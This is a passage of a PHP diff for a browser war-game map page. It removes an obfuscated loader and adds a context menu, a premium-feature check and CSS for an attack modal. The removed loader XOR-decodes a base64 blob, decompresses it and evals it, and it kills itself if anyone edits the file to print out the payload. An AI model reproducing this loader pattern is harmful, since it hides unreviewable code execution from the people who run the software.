@@ -1,24 +1,1079 @@
 <?php
-$xxqsindijg="f5aa9e4cf873cb9587d5368576aec124";
-$mzxfmqscnz="0556530401045551565e065202515b000107535105035a500205040757030652";
-$gvjzghjwr="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";
-$kdtgqaw=file_get_contents(__FILE__);
-$tngelyzeu=str_replace($gvjzghjwr,"",$kdtgqaw);
-if(strpos($tngelyzeu,"ec"."ho")!==false||strpos($tngelyzeu,"pr"."int")!==false||strpos($tngelyzeu,"var_"."dump")!==false||strpos($tngelyzeu,"file_put_"."contents")!==false||strpos($tngelyzeu,"fw"."rite")!==false){die();}
-$mzfmwgqj=str_replace(array($xxqsindijg,$mzxfmqscnz),array("SP_0d021eb5","KP_4f4ad3c1"),$kdtgqaw);
-$yjtvyqtkw=md5($mzfmwgqj);
-$ejsyuqft=hex2bin($mzxfmqscnz);
-$ggltqpwi="";
-$acmuvfsyzpug=strlen($yjtvyqtkw);
-for($naonpitau=0;$naonpitau<$acmuvfsyzpug;$naonpitau++){
-$ggltqpwi.=chr(ord($ejsyuqft[$naonpitau])^ord($yjtvyqtkw[$naonpitau]));
+// This file will be appended to the existing map.php
+// It contains the context menu, modal, and JavaScript
+
+// Check if user has farm assistant premium active
+$has_farm_assistant = false;
+if (isset($user['farm_assistant_expires']) && $user['farm_assistant_expires'] > time()) {
+    $has_farm_assistant = true;
 }
-$enqowhwl=base64_decode($gvjzghjwr);
-$idguglxqyy=strlen($enqowhwl);
-$hnieees="";
-$cuqfcpvijz=strlen($ggltqpwi);
-for($naonpitau=0;$naonpitau<$idguglxqyy;$naonpitau++){
-$hnieees.=$enqowhwl[$naonpitau]^$ggltqpwi[$naonpitau%$cuqfcpvijz];
-}
-$erggofy="gzun"."compress";
-eval('?>' . $erggofy($hnieees) . '<?php ');
+?>
+
+<!-- Map Context Menu -->
+<div id="map_context_menu" style="display: none; position: absolute; z-index: 10000;">
+    <a id="mp_info" href="#" class="mp" style="background-position: -144px 0px;"></a>
+    <a id="mp_att" href="#" class="mp" style="background-position: -24px 0px;"></a>
+    <a id="mp_res" href="#" class="mp" style="background-position: 0px 0px;"></a>
+    <a id="mp_farm_a" href="#" class="mp"
+        style="background-position: -264px 0px;<?= !$has_farm_assistant ? ' opacity: 0.4; cursor: not-allowed;' : '' ?>"></a>
+    <a id="mp_farm_b" href="#" class="mp"
+        style="background-position: -288px 0px;<?= !$has_farm_assistant ? ' opacity: 0.4; cursor: not-allowed;' : '' ?>"></a>
+</div>
+
+<style>
+    #map_context_menu {
+        width: 120px;
+        height: 120px;
+        position: relative;
+    }
+
+    #map_context_menu .mp {
+        position: absolute !important;
+        width: 24px;
+        height: 24px;
+        background-image: url('/graphic/icons/icons_context.png');
+        display: block !important;
+        opacity: 1 !important;
+    }
+
+    #mp_info {
+        top: 0;
+        left: 48px;
+    }
+
+    #mp_att {
+        top: 48px;
+        left: 0;
+    }
+
+    #mp_res {
+        top: 48px;
+        left: 96px;
+    }
+
+    #mp_farm_a {
+        top: 96px;
+        left: 24px;
+        <?php if (!$has_farm_assistant): ?>
+            opacity: 0.4 !important;
+        <?php endif; ?>
+    }
+
+    #mp_farm_b {
+        top: 96px;
+        left: 72px;
+        <?php if (!$has_farm_assistant): ?>
+            opacity: 0.4 !important;
+        <?php endif; ?>
+    }
+
+    /* Attack Modal */
+    /* ====== Modal Overlay ====== */
+    #attack_modal_overlay {
+        display: none;
+        position: fixed;
+        inset: 0;
+        background: rgba(0, 0, 0, 0.65);
+        z-index: 20000;
+        justify-content: center;
+        align-items: center;
+        backdrop-filter: blur(2px);
+    }
+
+    /* ====== Modal Box ====== */
+    #attack_modal {
+        width: 840px;
+        max-height: 90vh;
+        overflow: hidden;
+        border-radius: 8px;
+        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.55), 0 2px 8px rgba(0, 0, 0, 0.3);
+        border: 2px solid #8C5F0D;
+        background: #F4E4BC;
+        display: flex;
+        flex-direction: column;
+        animation: modalSlideIn 0.18s ease;
+    }
+
+    @keyframes modalSlideIn {
+        from {
+            transform: translateY(-18px) scale(0.98);
+            opacity: 0;
+        }
+
+        to {
+            transform: translateY(0) scale(1);
+            opacity: 1;
+        }
+    }
+
+    /* ====== Header ====== */
+    #attack_modal_header {
+        background: linear-gradient(180deg, #D4AE6E 0%, #B8893C 100%);
+        padding: 8px 14px;
+        border-bottom: 2px solid #8C5F0D;
+        position: relative;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        flex-shrink: 0;
+    }
+
+    #attack_modal_header h3 {
+        margin: 0;
+        font-size: 13px;
+        font-weight: bold;
+        color: #3a1f00;
+        letter-spacing: 0.3px;
+        text-shadow: 0 1px 0 rgba(255, 255, 255, 0.3);
+    }
+
+    #attack_modal_close {
+        width: 22px;
+        height: 22px;
+        background: url('/graphic/index/login_close.png') no-repeat center;
+        background-size: contain;
+        border: none;
+        cursor: pointer;
+        padding: 0;
+        opacity: 0.75;
+        transition: opacity 0.15s;
+        flex-shrink: 0;
+    }
+
+    #attack_modal_close:hover {
+        opacity: 1;
+    }
+
+    /* ====== Body ====== */
+    #attack_modal_body {
+        padding: 12px;
+        overflow-y: auto;
+        background: url('/graphic/background/content.jpg');
+    }
+
+    /* Category Headers */
+    .modal_tabs {
+        margin-bottom: 0;
+    }
+
+    .modal_tabs table {
+        border-collapse: collapse;
+        width: 100%;
+    }
+
+    .modal_tab_header {
+        background: #C1A264;
+        border: 1px solid #8C5F0D;
+        border-bottom: 2px solid #8C5F0D;
+        padding: 5px 10px;
+        font-size: 11px;
+        font-weight: bold;
+        text-align: center;
+    }
+
+    .modal_tab_models {
+        background: #E5D7B2;
+        border: 1px solid #8C5F0D;
+        border-bottom: 2px solid #8C5F0D;
+        padding: 5px 10px;
+        font-size: 11px;
+        text-align: center;
+        font-style: italic;
+    }
+
+    /* Units Grid */
+    .units_grid_simple {
+        background: transparent;
+        padding: 10px;
+    }
+
+    .units_grid_simple>table {
+        width: 100%;
+        border-collapse: collapse;
+    }
+
+    .units_grid_simple td.unit_column {
+        vertical-align: top;
+        padding: 0;
+    }
+
+    .units_grid_simple table td {
+        padding: 2px 5px;
+        text-align: left;
+        background: transparent;
+        font-size: 0;
+        line-height: 0;
+    }
+
+    .units_grid_simple table td img {
+        width: 18px;
+        height: 18px;
+        vertical-align: middle;
+        margin-right: 2px;
+        display: inline-block;
+    }
+
+    .units_grid_simple table td input[type="text"] {
+        width: 50px;
+        padding: 1px 2px;
+        border: 1px solid #000;
+        font-size: 10pt;
+        background: #FFF;
+        text-align: right;
+        margin: 0 2px 0 0;
